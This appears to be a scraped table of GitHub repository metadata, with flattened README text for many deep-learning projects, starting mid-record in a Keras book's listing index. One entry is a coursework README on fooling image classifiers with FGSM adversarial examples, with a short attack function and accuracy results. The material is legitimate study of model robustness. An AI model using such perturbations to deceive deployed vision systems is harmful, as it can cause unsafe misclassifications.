7 Different weight regularizer available in keras 108 4 8 Adding dropout to the IMDB network 101 Chapter4 listing4 8 py 5 1 Instantiating a small convnet 120 Chapter5 listing5 1 3 py 5 2 Adding a classifier on top of the convnet 121 5 3 Training the convnet on MNIST images 121 5 4 Copying images to training validation and test directories 132 Chapter5 listing5 4 py 5 5 Instantiating a small convnet for dogs vs cats classification 134 Chapter5 listing5 5 6 py 5 6 Configuring the model for training 135 5 7 Using ImageDataGenerator to read images from directories 135 Chapter5 listing5 7 10 py 5 8 Fitting the model using a batch generator 137 5 9 Saving the model 137 5 10 Displaying curves of loss and accuracy during training 137 5 11 Setting up a data augmentation via ImageDateGenerator 139 Chapter5 listing5 11 12 py 5 12 Displaying some randomly augmented training images 139 5 13 Defining a new convnet that includes dropout 141 Chapter5 listing5 13 15 py 5 14 Training the convnet using data augmentation generators 141 5 15 Saving the model 5 16 Instantiating the VGG16 convolutional base 145 Chapter5 listing5 16 py 5 17 Extracting features using the pretrained convolutional base 147 Chapter5 listing5 17 19 py 5 18 Defining and training the densely connected classifier 148 5 19 Plotting the results 148 5 20 Adding a densely connected classifier on top of the convolutional base 150 Chapter5 listing5 20 21 py 5 21 Training the model end to end with a frozen convolutional base 151 5 22 Freezing all layers up to a specific one 155 Chapter5 listing5 22 24 py 5 23 Fine tuning the model 156 5 24 Smoothing the plots 157 5 25 Preprocessing a single image 161 Chapter5 listing5 25 31 py 5 26 Displaying the test picture 161 5 27 Instantiating a model from an input tensor and a list of output tensors 162 5 28 Running the model in predict mode 163 5 29 Visualizing the fourth channel 163 5 30 Visualizing the seventh channel 163 5 31 Visualizing every channel in every intermediate activation 164 5 32 Defining the loss tensor for filter visualization 167 Chapter5 listing5 32 39 py 5 33 Obtaining the gradient of the loss with regard to the input 167 5 34 Gradient normalization trick 167 5 35 Fetching Numpy output values given Numpy input values 168 5 36 Loss maximization via stochastic gradient descent 168 5 37 Utility function to convert a tensor into a valid image 168 5 38 Function to generate filter visualizations 169 5 39 Generating a grid of all response patterns in a layer 170 5 40 Loading the VGG16 network with pretrained weights 173 Chapter5 listing5 40 44 py 5 41 Preprocessing an input image for VGG16 174 5 42 Setting up the Grad CAM algorithm 174 5 53 Heatmap post processing 175 5 44 Superimposing the heatmap with the original picture 176 6 1 Word level one hot encoding toy example 182 Chapter6 listing6 1 py 6 2 Character level one hot encoding toy example 182 Chapter6 listing6 2 py 6 3 Using Keras for word level one hot encoding 183 Chapter6 listing6 3 py 6 4 Word level one hot encoding with hashing trich toy example 183 Chapter6 listing6 4 py 6 5 Instantiating an Embedding layer 186 Chapter6 listing6 5 py 6 6 Loading the IMDB data for use with an Embedding layer 187 Chapter6 listing6 6 7 py 6 7 Using an Embedding layer and classifier on the IMDB data 187 6 8 Processing the labels of the raw IMDB data 189 Chapter6 listing6 8 15 py 6 9 Tokenizing the text of the raw IMDB data 189 6 10 Parsing the GloVe word embeddings file 190 6 11 Preparing the GloVe word embeddings matrix 191 6 12 Model definition 191 6 13 Loading pretrained word embeddings into the Embedding layer 191 6 14 Training and evaluation 192 6 15 Plotting the results 192 6 16 Training the same model without pretrained word embeddings 193 Chapter6 listing6 16 py 6 17 Tokenizing the data of the test set 194 Chapter6 listing6 17 18 py 6 18 Evaluating the model on the test set 195 6 19 Pseudocode RNN 196 Chapter6 listing6 19 py 6 20 More detailed pseudocode for the RNN 197 Chapter6 listing6 20 py 6 21 Numpy implementation of a simple RNN 197 Chapter6 listing6 21 py 6 22 Preparing the IMDB data 200 Chapter6 listing6 22 24 py 6 23 Training the model with Embeddin and SimpleRNN layers 200 6 24 Plotting results 200 6 25 Pseudocode details of the LSTM architecture 203 Chapter6 listing6 25 26 py 6 26 Pseudocode details of the LSTM architecture 203 6 27 Using the LSTM layer in Keras 205 Chapter6 listing6 27 py 6 28 Inspecting the data of the Jena weather dataset 208 Chapter6 listing6 28 31 py 6 29 Parsing the data 208 6 30 Plotting the temperature timeseries 209 6 31 Plotting the first 10 days of the temperature timeseries 209 6 32 Normalizing the data 210 Chapter6 listing6 32 34 py 6 33 Generator yielding timeseries samples and their targets 211 6 34 Preparing the training validation and test generators 211 6 35 Computing the common sense baseline MAE 213 Chapter6 listing6 35 36 py 6 36 Converting the MAE back to a Celsius error 213 6 37 Training and evaluating a densely connected model 213 Chapter6 listing6 37 38 py 6 38 Plotting results 214 6 39 Training and evaluating a GRU based model 215 Chapter6 listing6 39 py 6 40 Training and evaluating a dropout regularized GRU based model 217 Chapter6 listing6 40 py 6 41 Training and evaluating a dropout regularized stacked GRU model 218 Chapter6 listing6 41 py 6 42 Training and evaluating an LSTM using reverse sequences 220 Chapter6 listing6 42 py 6 43 Training and evaluating a bidirectional LSTM 221 Chapter6 listing6 43 py 6 44 Training a bidirectional GRU 222 Chapter6 listing6 44 py 6 45 Preparing the IMDB data 226 Chapter6 listing6 45 46 py 6 46 Training and evaluating a simple 1D convnet on the IMDB data 227 6 47 Training and evaluating a simple 1D convnet on the Jena data 228 Chapter6 listing6 47 py 6 48 Preparing higher resolution data generators for the Jena dataset 230 Chapter6 listing6 48 py 6 49 Model combining a 1D convolutional base and a GRU layer 230 7 1 Functional API implementation of a two input question answering model 239 Chapter7 listing7 1 2 py 7 2 Feeding data to a multi input model 239 7 3 Functional API implementation of a three output model 240 Chapter7 listing7 3 5 py 7 4 Compilation options of a multi output model multiple losses 241 7 5 Compilation options of a multi output model loss weighting 241 7 6 Feeding data to a multi output model 242 7 7 Text classification model to use with TensorBoard 253 Chapter7 listing7 7 9 py 7 8 Creating a directory for TensorBoard log files 253 7 9 Training the model with a TensorBoard callback 254 8 1 Reweighting a probability distribution to a different temperature 273 Chapter8 listing8 1 py 8 2 Downloading and parsing the initial text file 274 Chapter8 listing8 2 7 py 8 3 Vectorizing sequences of characters 275 8 4 Single layer LSTM model for next character prediction 275 8 5 Model compilation configuration 276 8 6 Function to sample the next character given the models predictions 276 8 7 Text generation loop 276 8 8 Loading the pretrained Inception V3 model 281 Chapter8 listing8 8 13 py 8 9 Setting up the DeepDream configuration 281 8 10 Defining the loss to be maximized 282 8 11 Gradient ascent process 282 8 12 Running gradient ascent over different successive scales 283 8 13 Auxiliary functions 284 8 14 Defining initial variables 289 Chapter8 listing8 14 22 py 8 15 Auxiliary functions 289 8 16 Loading the pretrained VGG19 network and applying it to the three images 290 8 17 Content loss 290 8 18 Style loss 290 8 19 Total variation loss 291 8 20 Defining the final loss that youll minimize 291 8 21 Setting up the gradient descent process 292 8 22 Style transfer loop 293 8 23 VAE encoder network 300 Chapter8 listing8 23 28 py 8 24 Latent space sampling function 301 8 25 VAE decoder network mapping latent space points to images 301 8 26 Custom layer used to compute the VAE loss 302 8 27 Training the VAE 302 8 28 Sampling a grid of points from the 2D latent space and decoding them to images 303 8 29 GAN generator network 308 Chapter8 listing8 29 32 py 8 30 The GAN discriminator network 309 8 31 Adversarial network 310 8 32 Implementing GAN training 310,2019-11-12T21:00:05Z,2019-11-19T11:48:48Z,Python,valterlej,User,1,1,0,1,master,valterlej,1,0,0,0,0,0,0
tuanhiep,deeplearning,n/a,deeplearning This project to control knowledge about deep learning,2019-11-22T20:40:25Z,2019-12-03T03:45:10Z,Python,tuanhiep,User,1,1,0,24,master,tuanhiep,1,0,0,0,0,0,0
Wingzxy,ADL_project_2020,n/a,ADLproject2020 Applied Deep learning coursework project Access to BlueCrystal4 is required to run the scripts TSCNN INDEPENDENT is the TSCNN late fusion architecture TSCNN DEPENDENT is our extension To use LMCNet execute sbatch LMCjob sh To use MCNet execute sbatch MCjob sh To use MLMCNet execute sbatch MLMCjob sh To use TSCNN INDEPENDENT execute sbatch TSCNNINDEPENDENTjob sh To use TSCNN DEPENDENT execute sbatch TSCNNDEPENDENTjob sh,2019-11-15T13:29:47Z,2019-12-15T02:00:22Z,Python,Wingzxy,User,1,1,0,28,master,aliunlu97#Wingzxy,2,0,0,0,0,0,0
tkclimb,dfit,n/a,dfit,2019-11-27T04:40:57Z,2019-11-29T02:42:55Z,Python,tkclimb,User,1,1,0,1,master,tkclimb,1,0,0,0,0,0,0
rmurphy2718,permutation-equivariance-in-deep-learning-tutorial,n/a,Brief tutorial on permutation equivariant functions in deep learning This tutorial will help bridge the gap to reading research papers on permutation equivariant functions in deep learning It includes a hands on code snipped written in Python using PyTorch,2019-11-29T04:04:36Z,2019-11-29T09:20:49Z,Jupyter Notebook,rmurphy2718,User,1,1,0,1,master,rmurphy2718,1,0,0,0,0,0,0
RAKIYOU,Attacking-Deep-Learning-with-Adversarial-Examples,n/a,Attacking Deep Learning with Adversarial Examples Introduction to Adversarial Examples AI technology based on deep learning is widely used today which is very powerful tending to bring change to every aspect of our society Is there any method which can attack or fool our AI technology Actually hackers can use adversarial examples to attack our AI system The adversarial example is a input image which is intentionally designed to fool our models but does not significantly interfere with the human eye Specifically adding imperceptible perturbations to the original input image does not cause any interference to the human eye but DL model misclassify it as another object with high confidence Imagine if the autonomous driving systems classify the red light sign as a bird hacker s malicious attack it could easily lead to a traffic accident Minimum Requirements Requirement 1 Design at least two networks Requirement 2 Train each net from two different initial weights Requirement 3 Generate many adversarial examples for each model and test them on all the models Requirement 4 Try a different set of epsilons and report its effects Dependencies Python 3 7 3 NVIDIA GeForce GTX 1080 NVIDIA GeForce GTX Titan X PyTorch 1 0 1 Section 1 Adversarial Examples on MNIST FGSM Attack The fast gradient sign method known as FGSM was described by Goodfellow et al in Explaining and Harnessing Adversarial Examples https arxiv org abs 1412 6572 FGSM works well by using the gradients of the neural network to create an adversarial example For an input image the method uses the gradients of the loss with respect to the input image to create a new image which maximises the loss This new image is called the adversarial image def fgsmattack image epsilon datagrad signdatagrad datagrad sign perturbedimage image epsilon signdatagrad return perturbedimage Statistical Results for Requirement 1 3 epsilon 0 05 accuracy ResNet1830 ResNet1860 MobileNetV230 MobileNetV260 ResNet1830 41 27 65 42 88 09 90 77 ResNet1860 60 96 40 28 87 67 90 48 MobileNetV230 91 09 90 57 11 99 59 66 MobileNetV260 91 22 90 46 33 70 21 60 epsilon 0 1 accuracy ResNet1830 ResNet1860 MobileNetV230 MobileNetV260 ResNet1830 14 75 38 92 52 69 72 17 ResNet1860 22 31 19 39 51 85 70 13 MobileNetV230 74 24 86 92 10 71 18 72 MobileNetV260 74 58 86 98 11 13 9 60 FGSM uses the gradients of the loss with respect to the input image to create a new image which maximises the loss for the specific net it works very well only on this net but not the others Statistical Results for Requirement 4 nets epochs epsilon accuracy after attack nets epochs epsilon accuracy after attack ResNet18 30 0 94 06 MobileNetV2 30 0 93 56 ResNet18 30 0 05 41 27 MobileNetV2 30 0 05 11 99 ResNet18 30 0 1 14 75 MobileNetV2 30 0 1 10 71 ResNet18 30 0 2 8 87 MobileNetV2 30 0 2 8 60 ResNet18 30 0 4 8 83 MobileNetV2 30 0 4 8 60 ResNet18 30 0 6 9 14 MobileNetV2 30 0 6 8 60 ResNet18 60 0 91 86 MobileNetV2 30 0 95 03 ResNet18 60 0 05 40 28 MobileNetV2 60 0 05 21 60 ResNet18 60 0 1 19 39 MobileNetV2 60 0 1 9 60 ResNet18 60 0 2 6 36 MobileNetV2 60 0 2 8 47 ResNet18 60 0 4 3 40 MobileNetV2 60 0 4 8 47 ResNet18 60 0 6 3 26 MobileNetV2 60 0 6 8 47 In our study FGSM was only used on the right prediction cases which means we ignore the original wrong prediction cases As shown in the table the accuracies decrease as the epsilon value increases Also note that here 0 case represents the original test accuracy on MNIST without any attack All the pre trained models are located here https drive google com open id 1FcU uBOzDVu J5Ag8Mr3iX2S0JdnE i,2019-12-02T11:18:06Z,2019-12-04T09:52:01Z,Jupyter Notebook,RAKIYOU,User,1,1,0,4,master,RAKIYOU,1,0,0,0,0,0,0
chongzicbo,Dive-into-Deep-Learning-tf.keras,n/a,tensorflowkeras tensorflowkeras,2019-11-26T09:56:56Z,2019-12-03T07:31:20Z,Jupyter Notebook,chongzicbo,User,1,1,0,42,master,chongzicbo,1,0,0,0,0,0,0
dyhancrspo,Fashion-Mnist-Classification-CNN-Deep-Learning,n/a,Fashion Mnist Classification CNN Deep Learning Based on Fashion MNIST we can see that the dataset we will use has the following size training data using 55 000 data samples testing data using 10 000 data samples data validation using 5000 data samples which has a vector dimension of 784 or 28x28 pixels Each data has an association label consisting of 10 classes Deep Learning deep learning use three convolutional layers The first layer will have 32 3 x 3 filters The second layer will have 64 3 x 3 filters and The third layer will have 128 3 x 3 filters In addition there are three max pooling layers each of size 2 x 2 Accuracy Testing Accuracy 0 88640 Training Accuracy 0 95312 Loss Accuracy 0 14120,2019-11-13T08:30:08Z,2019-11-27T08:32:27Z,Jupyter Notebook,dyhancrspo,User,1,1,0,5,master,dyhancrspo,1,0,0,0,0,0,0
PacktPublishing,Deep-Learning-with-PyTorch-1.x,n/a,Deep Learning with PyTorch 1 x This is the code repository for Deep Learning with PyTorch 1 x https www packtpub com data deep learning with pytorch 1 0 second edition published by Packt Implement deep learning techniques and neural network architecture variants using Python What is this book about PyTorch is gaining the attention of deep learning researchers and data science professionals due to its accessibility and efficiency along with the fact that it s more native to the Python way of development This book will get you up and running with this cutting edge deep learning library effectively guiding you through implementing deep learning concepts In this second edition you ll learn the fundamental aspects that power modern deep learning and explore the new features of the PyTorch 1 x library You ll understand how to solve real world problems using CNNs RNNs and LSTMs along with discovering state of the art modern deep learning architectures such as ResNet DenseNet and Inception You ll then focus on applying neural networks to domains such as computer vision and NLP Later chapters will demonstrate how to build train and scale a model with PyTorch and also cover complex neural networks such as GANs and autoencoders for producing text and images In addition to this you ll explore GPU computing and how it can be used to perform heavy computations Finally you ll learn how to work with deep learning based architectures for transfer learning and reinforcement learning problems By the end of this book you ll be able to confidently and easily implement deep learning applications in PyTorch This book covers the following exciting features Build text classification and language modeling systems using neural networks Implement transfer learning using advanced CNN architectures Use deep reinforcement learning techniques to solve optimization problems in PyTorch Mix multiple models for a powerful ensemble model Build image classifiers by implementing CNN architectures using PyTorch Get up to speed with reinforcement learning GANs LSTMs and RNNs with real world examples If you feel this book is for you get your copy https www amazon com Deep Learning PyTorch 1 x architecture dp 1838553002 today img src https raw githubusercontent com PacktPublishing GitHub master GitHub png alt https www packtpub com border 5 Instructions and Navigations All of the code is organized into folders For example Chapter02 The code will look like the following toystoryreview Just perfect Script character animation this manages to break free of the yoke of children s movie to simply be one of the best movies of the 90 s full stop print list toystoryreview Following is what you need for this book This book is for data scientists and machine learning engineers who are looking to explore deep learning algorithms using PyTorch 1 x Those who wish to migrate to PyTorch 1 x will find this book insightful To make the most out of this book working knowledge of Python programming and some knowledge of machine learning will be helpful With the following software and hardware list you can run all code files present in the book Chapter 1 9 Software and Hardware List Chapter Software required OS required All Python 3 6 or higher Windows Mac OS X and Linux Any All PyTorch 1 x Windows Mac OS X and Linux Any We also provide a PDF file that has color images of the screenshots diagrams used in this book Click here to download it http www packtpub com sites default files downloads 9781838553005ColorImages pdf Related products PyTorch 1 x Reinforcement Learning Cookbook Packt https www packtpub com data pytorch 1 0 reinforcement learning cookbook Amazon https www amazon com PyTorch Reinforcement Learning Cookbook self learning dp 1838551964 PyTorch Deep Learning Hands On Packt https www packtpub com big data and business intelligence hands deep learning pytorch Amazon https www amazon com Deep Reinforcement Learning Hands Q networks dp 1788834240 Get to Know the Author Laura Mitchell graduated with a degree in mathematics from the University of Edinburgh With 15 years of experience in the tech and data science space Laura is the lead data scientist at MagicLab whose brands have connected the lives of over 500 million people through dating social and business Laura has hands on experience in the delivery of projects surrounding natural language processing image classification and recommender systems from initial conception to production She has a passion for learning new technologies and keeping herself up to date with industry trends Sri Yogesh K is an experienced data scientist with a history of working in higher education He is skilled in Python Apache Spark deep learning Hadoop and machine learning He is a strong engineering professional with a Certificate of Engineering Excellence from the International School of Engineering INSOFE and is focused on big data analytics Sri has trained over 500 working professionals in data science and deep learning from companies including Flipkart Honeywell GE and Rakuten Additionally he has worked on various projects that involved deep learning and PyTorch Vishnu Subramanian has experience in leading architecting and implementing several big data analytical projects using artificial intelligence machine learning and deep learning He specializes in machine learning deep learning distributed machine learning and visualization He has experience in retail finance and travel domains Also he is good at understanding and coordinating between businesses AI and engineering teams Suggestions and Feedback Click here https docs google com forms d e 1FAIpQLSdy7dATC6QmEL81FIUuymZ0Wy9vH1jHkvpY57OiMeKGqibOw viewform if you have any feedback or suggestions,2019-12-03T04:51:57Z,2019-12-10T13:43:47Z,Jupyter Notebook,PacktPublishing,Organization,2,1,0,4,master,casijoe5231,1,0,0,0,0,0,0
gdjayan1,Deep-Learning---image-classification--cifar-10-dataset,n/a,,2019-11-10T14:08:24Z,2019-11-10T16:39:13Z,Jupyter Notebook,gdjayan1,User,1,1,0,3,master,gdjayan1,1,0,0,0,0,0,0
someshgkale123,Classification-of-Objects-using-Deep-Learning-Model,n/a,Classification of Objects using Deep Learning Model Training a Deep learning model to classify images of bricks balls or cylinders against a cluttered background using the pre trained Alexnet model in fastai pytorch to perform classification detection and segmentation simultaneously Implemented methods like classification of images creation of the bounding boxes around particular objects and segmentation of the images for easier analysis of different objects Training the fastai model for multi task learning using bbc1k dataset which includes images of bricks balls and cylinders Technologies used numpy pandas openCV scikit learn scipy python pytorch fastai google colab Dataset available at https drive google com open id 1pkWTihDOWHtghW7NietYVGi5Wpu9Wkn,2019-11-18T15:10:18Z,2019-12-01T13:29:46Z,Jupyter Notebook,someshgkale123,User,1,1,1,7,master,someshgkale123,1,0,0,1,0,0,0
sree369nidhi,Deep-Learning-with-TensorFlow-2.0,n/a,Deep Learning with TensorFlow 2 0 This repository contains implementations of some of the most popular Deep Learning algorithms,2019-12-01T17:35:09Z,2019-12-01T17:47:22Z,Jupyter Notebook,sree369nidhi,User,1,1,0,3,master,sree369nidhi,1,0,0,0,0,0,0
kennedykwangari,Deep-Learning-for-Natural-Language-Processing-,n/a,Deep Learning with Python This repository contains Deep Learning Projects worked on Tensorflow and Keras Deep Learning Projects Implementations,2019-11-21T22:25:03Z,2019-11-25T04:49:23Z,n/a,kennedykwangari,User,1,1,0,5,master,kennedykwangari,1,0,0,0,0,0,0
arpan65,Scanned-document-classification-using-deep-learning,n/a,Scanned Document Classification BFSI sectors deal with lots of unstructured scanned documents which are archived in document management systems for further use For example in Insurance sector when a policy goes for underwriting underwriters attached several raw notes with the policy Insureds also attach various kind of scanned documents like identity card bank statement letters etc In later parts of the policy life cycle if claims are made on a policy releted scanned documents also archeived Now it becomes a tedious job to identify a particular document from this vast repository The goal of this case study is to develop a deep learning based solution which can automatically classify scanned documents Data We will use the RVL CDIP Ryerson Vision Lab Complex Document Information Processing dataset which consists of 400 000 grayscale images in 16 classes with 25 000 images per class There are 320 000 training images 40 000 validation images and 40 000 test images The images are sized so their largest dimension does not exceed 1000 pixels link https www cs cmu edu aharley rvl cdip Folder Structure Data link to download data Models link to download trained models Notebooks DocManagement ipynb Anchor notebook paramtune Notebook for paramenter tunning PDF Notebook snapshots in PDF format Scripts Necessary scripts to recreate the result Screenshots All screenshots from the trining and evaluation process Training Stretegy We will use CNN Convolution Neural Networks to address the problem Instead of developing our own model from scratch we will use transfer learning here we will use models pretrined on ImageNet The current SOTA model for this genere of problem uses inter and intra domain transfer learning where an image is divided in to four parts header footer left body and right body A pretrained vgg16 model is first used to train over the whole images inter domain then this model is used to train the part of images Intra domain In this experiment we will take a different approach Instead of intradomain trainsfer learning using vgg16 we will develope two parallel models VGG16 and InceptionResNetV2 and will stack the model Our assumtion is that because of the different structure of these two models they will learn the different ascept of images and stacking them will result good generalization How hyperparameters will be tuned For any CNN the hypermeters are pooling size network size batch size choice of optimizers learning rate regularization input size etc To keep the main notebook neet we will do this experiments discreatly We have develope some utility functions in paramtune ipynb notebook Suppose after 10 epoch we got an accuacy of 47 We will use this model as testing baseline at that point and using the utility funtions we will check which configuration set i e bachsize optimizer learningrate will result better accuracy in future epochs In various phase we have tried with image size 64 128 224 optimizers vanila SGD rmsprop adam adamax batchsize 50 64 128 learning rate 10 4 to 0 1 Preferable Hardware Requirments GPU 16 24 GB RAM 500 GB HDD minimum 200GB Steps to Recreate Download the data from given link Execure final py to execute the whole pipeline Execute individual scripts notebook to execute modules License MIT license,2019-11-17T09:36:47Z,2019-11-23T09:14:28Z,Jupyter Notebook,arpan65,User,1,1,0,26,master,arpan65,1,0,0,0,0,0,1
hazemsamoaa,Image-denoising-using-unsupervised-deep-learning-,n/a,Image denoising using unsupervised deep learning In this project we use autoencoder which is one of the unsupervised deep learning algorithms The idea of Autoencoder is that it contains 2 Neural networks as opposed to each other one for encoding and the other one for upsampling or decoding in between there is a code or bottleneck layer In our example we will try to use mnist fashion data from TensorFlow add noise to the images by creating filters or kernels and add them to each image array to obtain the noised image Then feed those noised images into the autoencoder model to denoise the images The structure of the model is about 4 layers of convolutional layer 2D with max pooling Then one code layer with convolutional layer 2D and then reversed CNN by using UpSampling2D instead of max pooling and Conv2DTranspose rather than CONV2D layer The input dimension will be the same as the output,2019-11-21T17:14:38Z,2019-11-21T17:36:11Z,Jupyter Notebook,hazemsamoaa,User,1,1,0,3,master,hazemsamoaa,1,0,0,0,0,0,0
sebastian-ruiz,deep-learning-simulating-time-series-futures,n/a,Code for Application of Deep Learning for Simulating Time Series of Oil Futures This repository contains the code for the master s thesis Application of Deep Learning for Simulating Time Series of Oil Futures link to follow by Sebastian Ruiz for the program mathematics stochastics track at the University of Amsterdam Note The time series data of oil futures is purposely missing from this project as the data is not publicly available Getting Started Set PATHROOT correctly in env make a copy of env sample If importing data using the Calibration Library 1 Add CalibrationLib to project interpreter path In PyCharm Settings Project interpreter Cog Show All Select your interpreter Click funny folder button Add Select CalibrationLib 2 Set writableDir correctly in dataimporter config yaml 3 Run dataimporter importerrun py Training the models 1 Set the training and test data in root config yaml 2 To train all the autoencoder models run autoencoders autoencoderrunall py 3 To train all the GAN models run gans ganrunall py For each model the parameters can be set in the dictionary aeparams and ganparams for autoencoder parameters and GAN parameters respectively Helper files plotting py Provides function to plot curves Used to compare autoencoder input and output and show GAN simulations preprocessdata py Load data from pickle file and does the data pre processing It splits the data into training and test sets and it applies normalisation standardisation or log returns Autoencoders The code for the models is based on examples found in keras autoencoders https github com snatch59 keras autoencoders Standard Autoencoder Standard autoencoder with encoder and decoder Variational Autoencoder VAE The model from Auto Encoding Variational Bayes http arxiv org abs 1312 6114 Adversarial Autoencoder AAE The model from Adversarial Autoencoders http arxiv org abs 1511 05644 GANs Popular conditional GAN models The code is based on examples found in Keras GAN https github com eriklindernoren Keras GAN Standard GAN The generative adversarial network model from Generative adversarial networks http arxiv org abs 1406 2661 Wasserstein GAN The model from Wasserstein GAN https arxiv org abs 1701 07875 GAN CONV GAN using convolutional layers LSTMs The LSTM Model http arxiv org abs 1412 3555 is based on example code from Keras seq 2 seq Signal Prediction https github com LukeTonin keras seq 2 seq signal prediction GAIN The GAIN model GAIN Missing Data Imputation using Generative Adversarial Nets http arxiv org abs 1806 02920 is based on the Tensorflow example code from GAIN https github com jsyoon0823 GAIN Detect Anomalies The anomaly detection model uses the autoencoder model Classical Models The classical models include the Andersen Markov Model https ssrn com abstract 1138782 and some autoregressive models,2019-11-11T09:50:54Z,2019-11-30T13:02:16Z,Python,sebastian-ruiz,User,1,1,0,1,master,sebastian-ruiz,1,0,0,3,0,4,0
ivonajdenkoska,in-the-name-of-deep-learning,autoencoder#computer-vision#fine-tuning#segmentation,,2019-11-04T12:42:38Z,2019-11-04T14:06:25Z,Jupyter Notebook,ivonajdenkoska,User,1,1,1,35,master,tpopordanoska#ivonajdenkoska,2,0,0,0,0,0,0
jihoonerd,Human-level-control-through-deep-reinforcement-learning,atari#atlantis#boxing#breakout#deep-learning#deepmind#dqn#pong#reinforcement-learning,Human level control through deep reinforcement learning atlantis assets atlantis gif boxing assets boxing gif breakout assets breakout gif Pong assets pong gif This repository implements the notable paper Human level control through deep reinforcement learning https www nature com articles nature14236 This paper is widely known for a famous video clip https www youtube com watch v TmPfTpjtdgg which surpasses human s playing by a large gap The paper uses deep neural networks to map from complex visual information to optimal actions known as Deep Q network Features Employed TensorFlow 2 with performance optimization Simple structure Easy to reproduce You can see detailed explanation posting at HERE I am working on this yet smile Model Structure nn assets nn svg Requirements Refer requirements txt or Pipfile You can set your virtual environment by virtualenv recommended or pipenv Default running environment is assumed to be CPU ONLY If you want to run this repo on GPU machine just replace tensorflow to tensorflow gpu in package lists How to install virtualenv bash virtualenv venv source venv bin activate pip install r requirements txt pipenv bash pipenv install If you have trouble making virtual environment through pipenv try followings Get your python interpreter by bash which python Use the python interpreter to make virtual environment bash pipenv install three python YOUR PYTHON PATH Also in case of locking does not work you can simply skip it bash pipenv install skip lock How to run You can run Atari 2600 game with main py Running environment needs to be NoFrameskip from gym package bash python main py help usage main py h env ENV train play PLAY loginterval LOGINTERVAL saveweightinterval SAVEWEIGHTINTERVAL Atari DQN optional arguments h help show this help message and exit env ENV Should be NoFrameskip environment train Train agent with given environment play PLAY Play with a given weight directory loginterval LOGINTERVAL Interval of logging stdout saveweightinterval SAVEWEIGHTINTERVAL Interval of saving weights Example 1 Train BreakoutNoFrameskip v4 bash python main py env BreakoutNoFrameskip v4 train Example 2 Play PongNoFrameskip v4 with trained weights bash python main py env PongNoFrameskip v4 play log LOGDIR weights Example 3 Control log save interval bash python main py env BreakoutNoFrameskip v4 train loginterval 100 saveweightinterval 1000 Results This implementation is guaranteed to work well for Atlantis Boxing Breakout and Pong Tensorboard summary is located at archive Tensorboard will show following information Average Q value Epsilon for exploration Latest 100 avg reward clipped Loss Reward clipped Test score Total frames bash tensorboard logdir archive Single RTX 2080 Ti is used for the results below Thanks to JKeun https github com JKeun for allowing his computation resources Atalntis atlantis assets atlantisresult png Boxing boxing assets boxingresult png Breakout breakout assets breakoutresult png Pong Pong assets pongresult png BibTeX articlemnih2015humanlevel added at 2015 08 26T14 46 40 000 0200 author Mnih Volodymyr and Kavukcuoglu Koray and Silver David and Rusu Andrei A and Veness Joel and Bellemare Marc G and Graves Alex and Riedmiller Martin and Fidjeland Andreas K and Ostrovski Georg and Petersen Stig and Beattie Charles and Sadik Amir and Antonoglou Ioannis and King Helen and Kumaran Dharshan and Wierstra Daan and Legg Shane and Hassabis Demis biburl https www bibsonomy org bibtex 2fb15f4471c81dc2b9edf2304cb2f7083 hotho description Human level control through deep reinforcement learning nature14236 pdf interhash eac59980357d99db87b341b61ef6645f intrahash fb15f4471c81dc2b9edf2304cb2f7083 issn 00280836 journal Nature keywords deep learning toread month feb number 7540 pages 529 533 publisher Nature Publishing Group a division of Macmillan Publishers Limited All Rights Reserved timestamp 2015 08 26T14 46 40 000 0200 title Human level control through deep reinforcement learning url http dx doi org 10 1038 nature14236 volume 518 year 2015 Author Jihoon Kim jihoonerd https github com jihoonerd,2019-11-17T07:42:43Z,2019-11-26T01:35:59Z,Python,jihoonerd,User,1,1,0,7,master,jihoonerd,1,0,0,0,0,0,0
JAGANPS,self-driving-car-using-deep-learning,n/a,self driving car teaching ai to drive a car Screenshot ScreenShot png,2019-11-16T14:52:39Z,2019-11-30T10:20:35Z,Python,JAGANPS,User,1,1,0,1,master,JAGANPS,1,0,0,0,0,0,0
aieml,Deep-Learning-Neural-Networks-1-Day-Workshop,n/a,Deep Learning Neural Networks 1 Day Workshop In the Deep Learning amp Neural Networks 1 Day Workshop we discussed about the concepts of Artificial Intelligence Machine Learning amp Deep Learning We covered the theories and mathematics behind Deep Feed Forward type Neural Networks and at the last phase of the workshop a Neural Network was implemented in Google Co Lab using Tensorflow and Keras Video Links 1 Nvidia Deep Learning https www youtube com watch v Dy0hJWltsyE 2 Nvidia Self Driving Car https www youtube com watch v fmVWLr0X1Sk 3 MIT Black Betty https www youtube com watch v fCLI6kxFFTE 4 AlphaGO Documentary https www youtube com watch v jGyCsVhtW0M You can use Jupyter notebook in Anaconda Navigator to Implement Neural Networks in your PC Download Anaconda https www anaconda com distribution,2019-11-11T05:16:01Z,2019-11-12T16:32:47Z,Jupyter Notebook,aieml,User,1,1,1,3,master,aieml,1,0,0,0,0,0,0
IllgamhoDuck,Quantum-Circuit-Optimization-with-Deep-learning,n/a,Quantum Circuit Optimization with Deep learning This is a collection of educational notebooks about what is quantum circuit optimization and how to optimize quantum circuits using deep learning created for the IBM Q Challenge Teach Me Qiskit Award IBMQ https github com IllgamhoDuck Quantum Circuit Optimization with Deep learning blob master img IBMQ png raw true https ibmqawards com Recommend reading following chapter of the Qiskit textbook before you start QISKIT TESTBOOK https community qiskit org textbook preface html Chapter 0 Prerequisites Chapter 1 Quantum States and Qubits Chapter 2 Single Qubits and Multiple Qubits gates But if you don t want to go through it and just want to directly work on this you can go through directly Every notebook is created to be possible to implement without prior knowledge of deep learning and quantum computing But make sure you modify the path appropriatly D Introduction Currently quantum computers have a lot of noise Circuit optimization is an effort to reduce the statevector error the difference between the actual statevector from the ideal statevector caused by noise as much as possible This is a step towards fault tolerant quantum computing These notebooks explain circuit optimization in detail and a way to optimize quantum circuits using deep learning What is Quantum Circuit Optimization Quote https ibmqawards com developer challenge circuit optimization from IBM Optimize circuits to minimize noise when they are executed on a real IBMQ backend by using the properties of the backends themselves These properties contain information about the physics of the device such as qubit lifetimes decoherence and relaxation gate and readout error rates and gate latencies Why deep learning Currently quantum circuit optimization is done by the Qiskit transpiler It uses a graph data structure and A search to find the optimized layout and a way to swap qubits Few approaches use deep learning We made this series of educational notebooks using deep learning to provide a guideline for Deep Learning and Quantum Computing practitioners and to validate and encourage the use of deep learning to optimize quantum circuits Where to start Click the guide link to start D The guide notebook includes all of the informations you need You can search one by one using the below Guide of this project https github com IllgamhoDuck Quantum Circuit Optimization with Deep learning blob master QuantumcircuitoptimizationwithDeeplearning ipynb Highly recommended to go through these resources through the Google Colaboratory interface because they are designed for use through that interface Google Colaboratory https colab research google com notebooks welcome ipynb Index 0 Welcome 